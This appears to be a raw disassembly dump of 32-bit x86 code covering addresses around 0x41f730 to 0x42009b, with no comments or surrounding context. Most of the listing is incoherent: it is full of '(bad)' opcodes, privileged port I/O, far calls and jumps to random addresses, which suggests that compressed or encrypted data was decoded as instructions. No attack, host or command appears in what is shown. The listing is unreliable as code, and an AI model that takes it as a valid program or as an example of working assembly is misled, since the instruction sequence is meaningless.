  41f730:	sub    ch,bh
  41f732:	inc    edi
  41f733:	sub    DWORD PTR [esp+edx*8+0x54],eax
  41f737:	add    DWORD PTR [ebp+eiz*8+0x75],0x74
  41f73c:	or     al,0x3a
  41f73e:	pop    ecx
  41f73f:	and    ah,BYTE PTR [ebp+0x6f]
  41f742:	push   edx
  41f743:	push   ss
  41f744:	(bad)  
  41f745:	push   es
  41f746:	imul   edi,ebx,0x1bf9a430
  41f74c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f74d:	xor    eax,0x6c74f5a3
  41f752:	fsub   st,st(0)
  41f754:	and    dl,BYTE PTR [esi+0x4]
  41f757:	or     esp,DWORD PTR [ecx+eiz*8]
  41f75a:	mov    ecx,0xacb5420e
  41f75f:	ja     0x25b6ec56
  41f765:	in     al,dx
  41f766:	cmp    BYTE PTR [edi-0x51c3066],dl
  41f76c:	adc    cl,ch
  41f76e:	retf   
  41f76f:	mov    eax,ds:0x7fc632cc
  41f774:	(bad)  
  41f775:	ins    DWORD PTR es:[edi],dx
  41f776:	pop    ecx
  41f777:	push   ecx
  41f779:	sub    eax,0x3fe6cdbf
  41f77e:	cmp    edi,DWORD PTR [ecx-0x8]
  41f781:	in     al,dx
  41f782:	inc    ebp
  41f783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f784:	cwde   
  41f785:	dec    edx
  41f786:	clc    
  41f787:	fisubr DWORD PTR [eax+0x18c166d8]
  41f78d:	cmp    eax,0x6c95ae22
  41f792:	xchg   ebx,eax
  41f793:	(bad)  
  41f794:	scas   al,BYTE PTR es:[edi]
  41f795:	sar    BYTE PTR [esi],0xdd
  41f798:	iret   
  41f799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f79a:	pop    es
  41f79b:	and    BYTE PTR [ebp+0x2d],0x4d
  41f79f:	xor    eax,DWORD PTR [edi-0x5da18d4e]
  41f7a5:	pop    eax
  41f7a6:	push   edx
  41f7a7:	push   ss
  41f7a8:	dec    ebx
  41f7a9:	push   eax
  41f7aa:	xchg   DWORD PTR [edi+0x2efe76b5],esp
  41f7b0:	(bad)  
  41f7b1:	call   FWORD PTR [esi+0x75]
  41f7b4:	xchg   esi,eax
  41f7b5:	xor    eax,0xd317ec08
  41f7ba:	cmp    al,0x61
  41f7bc:	cwde   
  41f7bd:	push   ebx
  41f7be:	xchg   DWORD PTR [esi-0xf7e1823],esi
  41f7c4:	fdiv   QWORD PTR [edi+0x71b2713e]
  41f7ca:	mov    edx,0x7a245eb
  41f7cf:	ret    0xea15
  41f7d2:	aad    0x6e
  41f7d4:	pop    edi
  41f7d5:	retf   0x7423
  41f7d8:	add    DWORD PTR fs:[eax+0x6df73ca2],0xfffffff2
  41f7e0:	dec    edi
  41f7e1:	sbb    edx,DWORD PTR [ebp+eax*4-0x73]
  41f7e5:	jp     0x41f7b9
  41f7e7:	nop
  41f7e8:	nop
  41f7e9:	imul   ecx,DWORD PTR [ebx-0x24b6e866],0x8c75c6ba
  41f7f3:	daa    
  41f7f4:	stos   DWORD PTR es:[edi],eax
  41f7f5:	int    0xd4
  41f7f7:	add    dl,BYTE PTR [ebp-0x13]
  41f7fa:	in     eax,0xb9
  41f7fc:	ins    DWORD PTR es:[edi],dx
  41f7fd:	test   DWORD PTR [ecx+esi*2+0x53],esi
  41f801:	mov    al,ds:0x5afb01f3
  41f806:	pop    edx
  41f807:	fwait
  41f808:	not    dl
  41f80a:	sbb    esi,DWORD PTR [eax]
  41f80c:	imul   ecx,ecx,0x53002bcc
  41f812:	mov    dh,0x88
  41f814:	adc    DWORD PTR [edx+0x33540232],esi
  41f81a:	xcrypt-ofb (bad)
  41f81b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f81c:	sub    edx,DWORD PTR [edx+ebp*1-0x4716854f]
  41f823:	mov    ah,0xaf
  41f825:	sbb    ch,BYTE PTR [edx+0x1f]
  41f828:	in     al,dx
  41f829:	adc    ecx,esp
  41f82b:	ficom  DWORD PTR [edi+esi*1]
  41f82e:	ins    DWORD PTR es:[edi],dx
  41f82f:	mov    bl,0x7b
  41f831:	fld    DWORD PTR [edi+0xa8b8]
	...
  41f893:	add    BYTE PTR [eax],al
  41f895:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f89b:	xchg   ebx,eax
  41f89c:	mov    ecx,0x25be46bb
  41f8a1:	mov    edi,edi
  41f8a3:	pusha  
  41f8a4:	cmp    DWORD PTR [edx+0x14e51],0x7
  41f8ab:	add    DWORD PTR [eax],eax
  41f8ad:	add    dl,dl
  41f8af:	sti    
  41f8b0:	test   eax,0x95dfced5
  41f8b5:	sahf   
  41f8b6:	clc    
  41f8b7:	fwait
  41f8b8:	inc    esp
  41f8b9:	mov    bh,0xb0
  41f8bb:	jp     0x41f853
  41f8bd:	jne    0x41f918
  41f8bf:	xor    DWORD PTR [ebx],esp
  41f8c1:	sbb    edx,edx
  41f8c3:	mov    bl,0xeb
  41f8c5:	test   eax,0x19e3fa74
  41f8ca:	jmp    0xba1df2e8
  41f8cf:	xchg   esp,eax
  41f8d0:	sbb    DWORD PTR [ecx+0xb],ecx
  41f8d3:	push   ebx
  41f8d5:	mov    edi,0xa9c904e3
  41f8da:	add    bl,ch
  41f8dc:	xlat   BYTE PTR ds:[ebx]
  41f8dd:	adc    al,0xbb
  41f8df:	lods   eax,DWORD PTR ds:[esi]
  41f8e0:	and    eax,esi
  41f8e2:	inc    ebp
  41f8e3:	jecxz  0x41f896
  41f8e5:	xor    eax,0x3b945a91
  41f8ea:	mov    esi,0x8820320f
  41f8ef:	xchg   esi,eax
  41f8f0:	sub    bl,bl
  41f8f2:	ja     0x41f92b
  41f8f4:	icebp  
  41f8f5:	pop    ss
  41f8f6:	ret    0xb044
  41f8f9:	enter  0x7ff4,0xfc
  41f8fd:	jl     0x41f8da
  41f8ff:	or     ecx,DWORD PTR [ecx+ebp*2-0x481d06b9]
  41f906:	pop    ebx
  41f907:	cmc    
  41f908:	(bad)  
  41f909:	shl    DWORD PTR [edx+0x605023ff],cl
  41f90f:	cdq    
  41f910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f911:	retf   
  41f912:	dec    eax
  41f913:	mov    ds:0x1e8704ec,al
  41f918:	not    DWORD PTR [edi]
  41f91a:	scas   al,BYTE PTR es:[edi]
  41f91b:	popa   
  41f91c:	int3   
  41f91d:	dec    ebp
  41f91e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f91f:	adc    DWORD PTR [ebp+0x2b39d52d],esi
  41f925:	stc    
  41f926:	(bad)  
  41f928:	xchg   edi,eax
  41f929:	jg     0x41f8d3
  41f92b:	sub    ecx,DWORD PTR [eax+ebp*8]
  41f92e:	aas    
  41f92f:	xlat   BYTE PTR ds:[ebx]
  41f930:	dec    ecx
  41f931:	inc    DWORD PTR [ebx]
  41f933:	into   
  41f934:	fs dec esp
  41f936:	es in  eax,dx
  41f938:	dec    ebp
  41f939:	inc    DWORD PTR es:[edi+0x3f2adf55]
  41f940:	fldl2e 
  41f942:	push   ds
  41f943:	icebp  
  41f944:	xor    DWORD PTR [edx],esi
  41f946:	or     eax,0x53d9f631
  41f94b:	or     ebp,ebp
  41f94d:	aam    0xab
  41f94f:	inc    ebx
  41f950:	inc    dl
  41f952:	or     eax,DWORD PTR [esp+ebp*8-0x3]
  41f956:	push   edx
  41f957:	push   es
  41f958:	and    dh,bl
  41f95a:	js     0x41f975
  41f95c:	(bad)  
  41f95d:	cld    
  41f95e:	or     BYTE PTR ds:0x46f26e08,al
  41f964:	gs mov cl,0x31
  41f967:	xchg   ebx,eax
  41f968:	pop    ebp
  41f969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f96a:	iret   
  41f96b:	popa   
  41f96c:	cmc    
  41f96d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f96e:	mov    al,0x3b
  41f970:	lods   eax,DWORD PTR ds:[esi]
  41f971:	pop    ecx
  41f972:	push   eax
  41f973:	loopne 0x41f9db
  41f975:	(bad)  
  41f977:	rcl    esp,0x82
  41f97a:	cli    
  41f97b:	cwde   
  41f97c:	mov    cl,0x21
  41f97e:	or     DWORD PTR [ebx],ebx
  41f980:	test   DWORD PTR [ecx],ebx
  41f982:	mov    bh,0x76
  41f984:	(bad)  
  41f985:	xchg   edx,eax
  41f986:	pop    eax
  41f987:	jno    0x41f9d7
  41f989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f98a:	aam    0x31
  41f98c:	scas   eax,DWORD PTR es:[edi]
  41f98d:	mov    esi,0xeeb7434c
  41f992:	mov    esi,0xdf9e0218
  41f997:	push   esi
  41f998:	xor    dh,BYTE PTR [ebx]
  41f99a:	mov    eax,0x9950f114
  41f99f:	cmp    bl,BYTE PTR [ecx+0x2b]
  41f9a2:	outs   dx,DWORD PTR ds:[esi]
  41f9a3:	into   
  41f9a4:	in     eax,dx
  41f9a5:	iret   
  41f9a6:	pop    ds
  41f9a7:	lahf   
  41f9a8:	sahf   
  41f9a9:	lahf   
  41f9aa:	jns    0x41f9ef
  41f9ac:	or     DWORD PTR [edi-0x39342855],edx
  41f9b2:	dec    edx
  41f9b3:	jmp    0x41fa9c
	...
  41fa14:	add    BYTE PTR [eax],al
  41fa16:	or     al,BYTE PTR [ecx-0x49]
  41fa19:	mov    eax,ds:0xeb1ef7ff
  41fa1e:	fwait
  41fa1f:	mov    eax,0x77468e70
  41fa24:	push   eax
  41fa25:	mov    ds,WORD PTR [eax+0x4f]
  41fa28:	add    DWORD PTR [eax],eax
  41fa2a:	pop    es
  41fa2b:	add    DWORD PTR [eax],eax
  41fa2d:	add    ah,dl
  41fa2f:	cmp    dh,BYTE PTR [ecx]
  41fa31:	cwde   
  41fa32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa33:	icebp  
  41fa34:	in     eax,dx
  41fa35:	inc    edx
  41fa36:	shl    DWORD PTR [esi+esi*4-0x4f],1
  41fa3a:	and    eax,0xd588756d
  41fa3f:	mov    cl,dh
  41fa41:	cwde   
  41fa42:	jp     0x41fa51
  41fa44:	in     al,0x26
  41fa46:	cmp    bh,BYTE PTR [edi+ebx*8+0x7e]
  41fa4a:	ss push es
  41fa4c:	lahf   
  41fa4d:	inc    esp
  41fa4e:	and    DWORD PTR [ebx],0xffffff9c
  41fa51:	pop    es
  41fa52:	sub    al,0xb0
  41fa54:	lods   al,BYTE PTR ds:[esi]
  41fa55:	sub    eax,0x7c0d6b33
  41fa5a:	pop    edx
  41fa5b:	add    BYTE PTR ss:[edx-0xd9d39e3],al
  41fa62:	mov    WORD PTR [eax*1+0x3ba8bd90],fs
  41fa69:	or     DWORD PTR [edx-0x39ef57cf],esi
  41fa6f:	or     cl,BYTE PTR [edx-0x3f]
  41fa72:	clc    
  41fa73:	sar    BYTE PTR [esi-0x8e8a95f],1
  41fa79:	les    esi,FWORD PTR [eax]
  41fa7b:	lahf   
  41fa7c:	and    eax,0x8a66beef
  41fa81:	out    0x94,al
  41fa83:	cmp    BYTE PTR [esi-0x35],cl
  41fa86:	fistp  QWORD PTR [esi+ebp*1+0x4d]
  41fa8a:	(bad)  
  41fa8b:	data16 gs xor al,0xf9
  41fa8f:	jp     0x41fa82
  41fa91:	sti    
  41fa92:	aad    0xb2
  41fa94:	xor    ah,BYTE PTR [edi+0x644fbc54]
  41fa9a:	or     BYTE PTR [edi],ch
  41fa9c:	add    BYTE PTR [ebx-0x28],0x6
  41faa0:	jl     0x41fb05
  41faa2:	sar    BYTE PTR [ebx],0xd1
  41faa5:	repz mov bl,0x65
  41faa8:	jmp    0x41fa96
  41faaa:	mov    ch,0xa1
  41faac:	shl    bl,cl
  41faae:	out    0x7e,eax
  41fab0:	dec    ebx
  41fab1:	lds    esp,FWORD PTR [ecx]
  41fab3:	cmove  eax,DWORD PTR [eax]
  41fab6:	scas   eax,DWORD PTR es:[edi]
  41fab7:	retf   0x24a0
  41faba:	cmp    ah,BYTE PTR [eax]
  41fabc:	pop    ds
  41fabd:	and    ah,al
  41fabf:	push   ebx
  41fac0:	iret   
  41fac1:	cmp    BYTE PTR [esi+0x2f],bl
  41fac4:	push   eax
  41fac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fac6:	xchg   esp,eax
  41fac7:	xor    eax,0x89e24d34
  41facc:	sbb    BYTE PTR [esi-0x4a21c8ff],bl
  41fad2:	xchg   esp,eax
  41fad3:	out    dx,al
  41fad4:	push   esp
  41fad5:	xor    BYTE PTR [esp+eax*4],al
  41fad8:	jo     0x41faa8
  41fada:	in     al,0x90
  41fadc:	mov    eax,0xa0ea23f1
  41fae1:	retf   0xcc02
  41fae4:	addr16 mov al,0xd5
  41fae7:	retf   
  41fae8:	dec    esp
  41fae9:	inc    esp
  41faea:	aaa    
  41faeb:	test   bl,ch
  41faed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faee:	cmp    dl,BYTE PTR [edi]
  41faf0:	push   0xc68d3748
  41faf5:	or     esp,DWORD PTR [ecx-0x3d]
  41faf8:	lds    esi,FWORD PTR [esi+0x10]
  41fafb:	test   ebp,0x605978a6
  41fb01:	or     eax,0xf120e281
  41fb06:	rol    edx,cl
  41fb08:	inc    ebx
  41fb09:	(bad)  
  41fb0a:	daa    
  41fb0b:	push   edi
  41fb0c:	test   BYTE PTR [ebp+0x16],bh
  41fb0f:	(bad)  
  41fb10:	lock pushf 
  41fb12:	and    dl,ah
  41fb14:	xlat   BYTE PTR ds:[ebx]
  41fb15:	dec    ebx
  41fb16:	gs inc ebp
  41fb18:	out    dx,eax
  41fb19:	int3   
  41fb1a:	sbb    al,0xc5
  41fb1c:	out    dx,eax
  41fb1d:	jp     0x41fab5
  41fb1f:	aam    0x98
  41fb21:	cli    
  41fb22:	push   esp
  41fb23:	inc    edx
  41fb24:	ret    
  41fb25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb26:	lods   eax,DWORD PTR ds:[esi]
  41fb27:	popf   
  41fb28:	jmp    0x8ca:0x9d68b5b5
  41fb2f:	pop    edx
  41fb30:	mov    eax,ecx
  41fb32:	jb     0x41fb3b
  41fb34:	out    0x0,eax
	...
  41fb96:	fsubr  QWORD PTR [eax]
  41fb98:	mov    ah,ah
  41fb9a:	(bad)  
  41fb9b:	out    0xfe,al
  41fb9d:	cmp    cl,ah
  41fb9f:	cmc    
  41fba0:	push   cs
  41fba1:	adc    al,0x59
  41fba3:	mov    ah,0xbf
  41fba5:	xor    DWORD PTR [edi+0x50],ebx
  41fba8:	add    DWORD PTR [eax],eax
  41fbaa:	pop    es
  41fbab:	add    DWORD PTR [eax],eax
  41fbad:	add    BYTE PTR [eax-0xe],dh
  41fbb0:	xchg   esi,eax
  41fbb1:	fiadd  DWORD PTR [eax+0xfe464a6]
  41fbb7:	lods   al,BYTE PTR ds:[esi]
  41fbb8:	repz cmp BYTE PTR [ebx],bh
  41fbbb:	ins    DWORD PTR es:[edi],dx
  41fbbc:	repz sbb bl,BYTE PTR [esi]
  41fbbf:	ss aas 
  41fbc1:	ret    0xb487
  41fbc4:	stos   DWORD PTR es:[edi],eax
  41fbc5:	mov    esi,0x855c0c64
  41fbca:	jp     0x41fb5c
  41fbcc:	xchg   esp,eax
  41fbcd:	test   DWORD PTR [ecx-0x3a],edi
  41fbd0:	cdq    
  41fbd1:	stc    
  41fbd2:	popf   
  41fbd3:	push   edi
  41fbd4:	jb     0x41fc18
  41fbd6:	add    BYTE PTR [edi-0x196ec97e],dl
  41fbdc:	sbb    DWORD PTR [edx],0x5e
  41fbdf:	dec    ecx
  41fbe0:	test   eax,0xaf69b212
  41fbe5:	call   0xa145:0x65e22ac6
  41fbec:	jae    0x41fbe9
  41fbee:	mov    ebp,DWORD PTR [edx-0x27]
  41fbf1:	mov    esi,0xc7323703
  41fbf6:	sbb    edi,DWORD PTR [esp+edi*2+0x45d6da75]
  41fbfd:	ret    0xec59
  41fc00:	iret   
  41fc01:	ss pop edx
  41fc03:	and    edi,esp
  41fc05:	pop    eax
  41fc06:	stc    
  41fc07:	cmp    dh,BYTE PTR [eax]
  41fc09:	ss mov al,0x63
  41fc0c:	call   0xceb48113
  41fc11:	or     DWORD PTR [ebx],ebp
  41fc13:	fisttp WORD PTR [ebx-0x11]
  41fc16:	inc    ebp
  41fc17:	fidiv  DWORD PTR es:[edi+0x77]
  41fc1b:	ins    BYTE PTR es:[edi],dx
  41fc1c:	and    edi,DWORD PTR [edi-0x76]
  41fc1f:	imul   eax,ecx,0x2790a696
  41fc25:	icebp  
  41fc26:	fcmovbe st,st(6)
  41fc28:	lods   eax,DWORD PTR ds:[esi]
  41fc29:	enter  0xc213,0x2e
  41fc2d:	clc    
  41fc2e:	and    dl,BYTE PTR [ecx+0x140e8279]
  41fc34:	adc    ebx,esp
  41fc36:	mov    esp,0xff80ebc5
  41fc3b:	out    dx,al
  41fc3c:	call   DWORD PTR [edx+0x249a8aec]
  41fc42:	in     eax,0xe7
  41fc44:	inc    edi
  41fc45:	aaa    
  41fc46:	repz cmc 
  41fc48:	inc    ecx
  41fc49:	jmp    0xd6fe3d17
  41fc4e:	fsub   st,st(1)
  41fc50:	jmp    0xa5f0792d
  41fc55:	sbb    edi,eax
  41fc57:	fucomi st,st(4)
  41fc59:	in     al,dx
  41fc5a:	sbb    eax,0xc66a2ee2
  41fc5f:	lods   al,BYTE PTR ds:[esi]
  41fc60:	xchg   ebx,eax
  41fc61:	xor    al,0xc8
  41fc63:	mov    bl,0x15
  41fc65:	ds sub edi,0xffffffa3
  41fc69:	sub    DWORD PTR [ecx-0x20],ecx
  41fc6c:	cld    
  41fc6d:	jl     0x41fcba
  41fc6f:	inc    ebp
  41fc70:	int3   
  41fc71:	pusha  
  41fc72:	leave  
  41fc73:	lods   eax,DWORD PTR ds:[esi]
  41fc74:	pop    ebp
  41fc75:	fdiv   QWORD PTR [ecx-0x54]
  41fc78:	sub    eax,0xec9c4f74
  41fc7d:	adc    dh,BYTE PTR [edi+0x305823ba]
  41fc83:	xor    edi,DWORD PTR [esi+0x757296f1]
  41fc89:	(bad)  
  41fc8a:	xor    eax,0x466de3dd
  41fc8f:	leave  
  41fc90:	xor    ch,BYTE PTR [esi]
  41fc92:	ds cdq 
  41fc94:	ror    edi,1
  41fc96:	std    
  41fc97:	push   ebp
  41fc98:	sahf   
  41fc99:	scas   eax,DWORD PTR es:[edi]
  41fc9a:	jp     0x41fcf7
  41fc9c:	mov    eax,DWORD PTR [ebp+0x22bf81c8]
  41fca2:	retf   0x4066
  41fca5:	int3   
  41fca6:	pop    edi
  41fca7:	out    0xb0,eax
  41fca9:	jecxz  0x41fc9b
  41fcab:	add    al,0x34
  41fcad:	or     DWORD PTR [ecx-0xff69816],0x23
  41fcb4:	mov    BYTE PTR [eax],al
	...
  41fd16:	or     al,0x6a
  41fd18:	push   edx
  41fd19:	shl    DWORD PTR [esi-0x7],0x9f
  41fd1d:	out    dx,eax
  41fd1e:	je     0x41fd3b
  41fd20:	pop    ebp
  41fd21:	inc    edi
  41fd22:	inc    esp
  41fd23:	or     DWORD PTR [ebp-0x57],ecx
  41fd26:	push   cx
  41fd28:	add    DWORD PTR [eax],eax
  41fd2a:	pop    es
  41fd2b:	add    DWORD PTR [eax],eax
  41fd2d:	add    al,cl
  41fd2f:	icebp  
  41fd30:	jmp    0xb36ee844
  41fd35:	in     al,dx
  41fd36:	in     al,0xf5
  41fd38:	push   cs
  41fd39:	sub    al,0xb9
  41fd3b:	pop    ebx
  41fd3c:	sub    ecx,DWORD PTR [eax]
  41fd3e:	mov    ebx,0xf28f644
  41fd43:	mov    bh,0x87
  41fd45:	sbb    al,0x7a
  41fd47:	adc    BYTE PTR [ebp-0x7f],bl
  41fd4a:	inc    esi
  41fd4b:	ins    BYTE PTR es:[edi],dx
  41fd4c:	sbb    eax,edi
  41fd4e:	push   esi
  41fd4f:	loope  0x41fce8
  41fd51:	aaa    
  41fd52:	leave  
  41fd53:	push   cs
  41fd54:	mov    al,ds:0x245cea71
  41fd59:	sahf   
  41fd5a:	and    al,0x1e
  41fd5c:	or     DWORD PTR [esp+esi*1],0x1c
  41fd60:	mov    ebp,0x86e592eb
  41fd65:	imul   edi,DWORD PTR [ecx],0x1a64bca7
  41fd6b:	dec    esp
  41fd6c:	lahf   
  41fd6d:	or     edi,ebx
  41fd6f:	mov    dh,0x29
  41fd71:	stc    
  41fd72:	inc    ebx
  41fd73:	in     eax,dx
  41fd74:	mov    eax,ds:0xe23723d0
  41fd79:	push   edx
  41fd7a:	std    
  41fd7b:	sub    DWORD PTR [eax-0x60],ecx
  41fd7e:	or     DWORD PTR [eax],edi
  41fd80:	or     BYTE PTR [ebx-0x46d8e60c],bh
  41fd86:	lods   al,BYTE PTR ds:[esi]
  41fd87:	and    BYTE PTR [edx+0x1d],dl
  41fd8a:	mov    dh,0x59
  41fd8c:	test   BYTE PTR [eax],bh
  41fd8e:	adc    BYTE PTR [edx+0x79],dh
  41fd91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd92:	add    eax,0x9d1e79d9
  41fd97:	jnp    0x41fd56
  41fd99:	adc    BYTE PTR [eax+0x5943b70d],dh
  41fd9f:	hlt    
  41fda0:	ins    BYTE PTR es:[edi],dx
  41fda1:	or     al,0x55
  41fda3:	xor    eax,0x43865117
  41fda8:	inc    eax
  41fda9:	(bad)  
  41fdaa:	sbb    eax,0x44c0bed3
  41fdaf:	test   ebx,ecx
  41fdb1:	push   edx
  41fdb2:	scas   al,BYTE PTR es:[edi]
  41fdb3:	push   es
  41fdb4:	jne    0x41fdcd
  41fdb6:	pop    edx
  41fdb7:	ret    0x159d
  41fdba:	adc    al,0xc6
  41fdbc:	push   esi
  41fdbd:	mov    edi,0x92938867
  41fdc2:	mov    ebp,0xd3a67d96
  41fdc7:	sbb    DWORD PTR [edi],ecx
  41fdc9:	nop
  41fdca:	(bad)  
  41fdcb:	imul   cl
  41fdcd:	pop    es
  41fdce:	int3   
  41fdcf:	and    eax,0x532dc9e
  41fdd4:	sub    ch,BYTE PTR [ecx]
  41fdd6:	cmp    cl,bh
  41fdd8:	pop    es
  41fdd9:	dec    ebp
  41fdda:	xchg   edx,eax
  41fddb:	push   edi
  41fddc:	add    BYTE PTR [eax-0x1e33d213],0x8f
  41fde3:	shl    DWORD PTR [ecx+0x4b503fff],0xf
  41fdea:	(bad)  
  41fdeb:	(bad)  
  41fded:	dec    esi
  41fdee:	xor    ecx,0xfffffff5
  41fdf1:	push   cs
  41fdf2:	test   DWORD PTR [ebx-0x15472222],0xed40214f
  41fdfc:	jbe    0x41fdfe
  41fdfe:	int    0x1d
  41fe00:	inc    edx
  41fe01:	call   0x6277:0xe79d2975
  41fe08:	jp     0x41fe1c
  41fe0a:	clc    
  41fe0b:	iret   
  41fe0c:	jo     0x41fd96
  41fe0e:	fld    DWORD PTR ds:0x66b9acfe
  41fe14:	mov    bl,0xa7
  41fe16:	and    esi,DWORD PTR [ebp-0x448b63c4]
  41fe1c:	pusha  
  41fe1d:	push   ebx
  41fe1e:	sbb    DWORD PTR [ebx+0x7],ebx
  41fe21:	inc    eax
  41fe22:	sub    DWORD PTR [ebp-0x2568ba1c],ebp
  41fe28:	and    DWORD PTR [ecx],0x7c55654e
  41fe2e:	shl    ebx,0xb7
  41fe31:	or     dl,bh
  41fe33:	test   DWORD PTR [eax+0x0],esi
	...
  41fe95:	add    BYTE PTR [edx-0x1865ab],ch
  41fe9b:	out    dx,eax
  41fe9c:	call   FWORD PTR [ebp+0x51]
  41fe9f:	lock xor DWORD PTR [edi-0x7f],0x22
  41fea4:	nop
  41fea5:	mov    BYTE PTR [ebp+0x52],ch
  41fea8:	add    DWORD PTR [eax],eax
  41feaa:	pop    es
  41feab:	add    DWORD PTR [eax],eax
  41fead:	add    BYTE PTR [ebp-0x32e953da],ch
  41feb3:	dec    BYTE PTR [edx]
  41feb5:	jmp    0x41ff18
  41feb7:	fsub   DWORD PTR [edx+eax*4-0x47]
  41febb:	lahf   
  41febc:	scas   eax,DWORD PTR es:[edi]
  41febd:	std    
  41febe:	outs   dx,BYTE PTR ds:[esi]
  41febf:	inc    ecx
  41fec0:	inc    esp
  41fec1:	mov    eax,ds:0x68932233
  41fec6:	scas   eax,DWORD PTR es:[edi]
  41fec7:	jmp    0x449c6cfb
  41fecc:	addr16 pop edx
  41fece:	push   ebp
  41fecf:	push   ecx
  41fed0:	cwde   
  41fed1:	xchg   ebp,eax
  41fed2:	add    eax,0xd9a6ac6d
  41fed7:	jmp    0x41fec9
  41fed9:	cmp    al,0x6a
  41fedb:	cmp    DWORD PTR [esp+edx*8],ebp
  41fede:	cmp    eax,edx
  41fee0:	mov    edi,0x2005f1e2
  41fee5:	leave  
  41fee6:	xchg   edi,eax
  41fee7:	push   ecx
  41fee8:	lahf   
  41fee9:	sub    dl,BYTE PTR [ebp-0x4a727ecd]
  41feef:	mov    edx,0x50cd5a50
  41fef4:	ficom  WORD PTR [eax-0x13]
  41fef7:	and    BYTE PTR [ebp-0x2f],0xa0
  41fefb:	adc    dl,BYTE PTR [ecx+0x5476baa8]
  41ff01:	or     DWORD PTR [ebx-0x54],ebp
  41ff04:	test   DWORD PTR [edi-0xd],edi
  41ff07:	jge    0x41ff3d
  41ff09:	adc    ecx,ebx
  41ff0b:	ss inc edi
  41ff0d:	out    0xbb,eax
  41ff0f:	rcr    BYTE PTR [eax+0x7d56739e],0xb1
  41ff16:	push   ebx
  41ff17:	ins    DWORD PTR es:[edi],dx
  41ff18:	jnp    0x41fedb
  41ff1a:	movlps xmm2,QWORD PTR [esi-0x56]
  41ff1e:	lea    ebp,[edi+0x7a96d0c4]
  41ff24:	in     eax,0x15
  41ff26:	pop    ds
  41ff27:	inc    ebx
  41ff28:	dec    esp
  41ff29:	mov    eax,0x2ac05bb2
  41ff2e:	aad    0xcb
  41ff30:	dec    eax
  41ff31:	fwait
  41ff32:	nop
  41ff33:	lock das 
  41ff35:	jo     0x41ff71
  41ff37:	sbb    BYTE PTR [edi],ch
  41ff39:	and    eax,0x8b99146
  41ff3e:	pop    edi
  41ff3f:	repz bswap ebx
  41ff42:	aas    
  41ff43:	dec    esp
  41ff44:	stos   BYTE PTR es:[edi],al
  41ff45:	(bad)  
  41ff46:	enter  0xfb8f,0xe6
  41ff4a:	or     edx,0x4e
  41ff4d:	ret    
  41ff4e:	cmp    DWORD PTR [esi+0x5549c730],eax
  41ff54:	mov    edx,0xc445a71e
  41ff59:	mov    ebx,0x1b7a5b62
  41ff5e:	dec    DWORD PTR [ebp-0x23]
  41ff61:	lock or BYTE PTR [ebp-0x5a52dfa9],dl
  41ff68:	ret    0x2f4f
  41ff6b:	call   0x217:0x75dd7014
  41ff72:	mov    BYTE PTR [ecx+0xa],al
  41ff75:	gs inc ebx
  41ff77:	and    eax,0xa02e34b
  41ff7c:	aam    0x79
  41ff7e:	fadd   st(6),st
  41ff80:	aam    0xee
  41ff82:	cwde   
  41ff83:	gs call 0x9799:0x6c426927
  41ff8b:	ficomp DWORD PTR [edx]
  41ff8d:	xchg   esp,eax
  41ff8e:	bound  ebp,QWORD PTR [esi-0x59d7f59c]
  41ff94:	lock or edi,DWORD PTR [esi+0x7e9302ae]
  41ff9b:	das    
  41ff9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff9d:	inc    BYTE PTR [ebp-0x53]
  41ffa0:	div    DWORD PTR [edx+0x347c9d64]
  41ffa6:	test   al,0xff
  41ffa8:	or     eax,0x87ab1511
  41ffad:	scas   al,BYTE PTR es:[edi]
  41ffae:	sahf   
  41ffaf:	fidivr DWORD PTR [edi+eax*8+0x6ea24b]
	...
  420016:	bound  esp,QWORD PTR [ebp-0x8808a]
  42001c:	imul   edi,DWORD PTR [ebp-0x2ab923c6],0x23
  420023:	cli    
  420024:	pop    eax
  420025:	bound  esi,QWORD PTR [ebx+edx*2+0x1]
  420029:	add    BYTE PTR [edi],al
  42002b:	add    DWORD PTR [eax],eax
  42002d:	add    bl,cl
  42002f:	out    0xa0,eax
  420031:	icebp  
  420032:	xor    BYTE PTR [ebx],0x87
  420035:	push   ecx
  420036:	sbb    DWORD PTR [ebp-0x7d],0x41b25775
  42003d:	or     ch,bl
  42003f:	ret    
  420040:	inc    ebp
  420041:	shl    DWORD PTR [edx-0x1e463cec],1
  420047:	mov    ebx,0x37ccdb2e
  42004c:	cdq    
  42004d:	sbb    ch,bl
  42004f:	xchg   BYTE PTR [ebx-0xf],dl
  420052:	in     al,0xc8
  420054:	push   ecx
  420055:	add    eax,0xc3bcd0ac
  42005a:	mov    dh,0x7b
  42005c:	test   eax,0x4b304fc6
  420061:	inc    esi
  420062:	or     al,0xa9
  420064:	push   ebp
  420065:	mov    ch,0x29
  420067:	sub    cl,BYTE PTR [edx]
  420069:	rcr    DWORD PTR [ecx],1
  42006b:	inc    ebx
  42006c:	test   BYTE PTR [ebx-0x62],dl
  42006f:	mov    bh,0x9f
  420071:	call   0x7e04545b
  420076:	push   0x64
  420078:	add    BYTE PTR [esi],al
  42007a:	aam    0x70
  42007c:	cmp    BYTE PTR [edi+0x2cc77b80],0xab
  420083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420084:	push   ss
  420085:	mov    edx,0x72f97d72
  42008a:	vpshlw ymm15,xmm4,[eax+0x3e]
  420090:	add    esi,esi
  420092:	dec    ebx
  420093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420094:	icebp  
  420095:	stos   DWORD PTR es:[edi],eax
  420096:	pop    ebp
  420097:	and    BYTE PTR [ecx-0x50],0x80
  42009b:	inc    eax
